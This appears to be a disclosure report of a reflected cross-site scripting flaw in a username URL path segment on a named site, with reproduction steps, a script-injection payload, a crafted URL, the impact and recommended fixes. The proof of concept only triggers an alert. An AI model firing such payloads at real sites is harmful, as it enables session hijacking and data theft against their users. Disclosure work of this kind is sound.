## Title

Reflected Cross-Site Scripting (XSS) via Username in URL Path

## Vulnerability Type

Reflected XSS

## Summary

The application reflects user-controlled input from the URL path directly into the page without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

The issue occurs when the username segment in the URL path is replaced with a malicious payload.

## Vulnerable Endpoint

```http
https://kzlabs.com/58.php/account/<username>/messages
```

## Vulnerable Input

```http
Username URL Path Segment
```

## Steps to Reproduce

1. Replace the username in the URL path with the following payload:

```html
'xicorr'"><sCript>alert("aaqib1")</script>
```

2. Open the crafted URL:

```http
https://kzlabs.com/58.php/account/'xicorr'"><sCript>alert("aaqib1")</script>/messages
```

3. Observe that a JavaScript alert popup is triggered automatically on page load.

## Payload Used

```html
'xicorr'"><sCript>alert("aaqib1")</script>
```

## Proof of Concept

The application reflects the username path segment into the page without proper sanitization, allowing arbitrary HTML and JavaScript injection.

By changing the username value in the URL path to a malicious payload, JavaScript executes automatically when the page loads.

### Screenshot 1 — Malicious Payload Injected in URL Path

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/2e05ac8f-24ab-49d8-bc08-db4d631c8aaa" />


### Screenshot 2 — Alert Popup Triggered

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/3e1e6cf7-da3e-4f12-af02-3bea8219fcf6" />


## Impact

An attacker can exploit this vulnerability to:

- Execute arbitrary JavaScript in the victim’s browser
- Hijack authenticated user sessions
- Perform unauthorized actions on behalf of users
- Exfiltrate sensitive information
- Conduct phishing attacks using trusted application context

## Recommendations for Fix

- Properly sanitize and encode user-controlled input reflected from URL paths
- Avoid rendering raw user input directly into HTML contexts
- Apply contextual output encoding before rendering user data
- Implement a strict Content Security Policy (CSP)
- Validate URL path parameters against expected formats
